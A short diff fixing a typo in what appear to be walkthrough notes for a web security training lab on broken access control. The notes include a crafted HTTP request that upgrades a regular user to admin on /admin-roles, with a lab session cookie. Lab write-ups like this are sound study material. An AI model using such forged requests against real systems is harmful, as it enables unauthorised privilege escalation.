@@ -25,7 +25,7 @@
     -as the regular user you cannot
     - change the method to GET and path as /admin-roles
     - realise the server responds with *missing parameter 'username*
-    - observer the request sent by admin and craft similar one to that as shown:
+    - observe the request sent by admin and craft similar one to that as shown:
         POST /admin-roles?username=wiener&action=upgrade HTTP/2
         Host: 0aa70076033dc29c803267a700750036.web-security-academy.net
         Cookie: session=Gm3NLGDGiQkGtPmy1fpZ7oRhSHWdkH1T
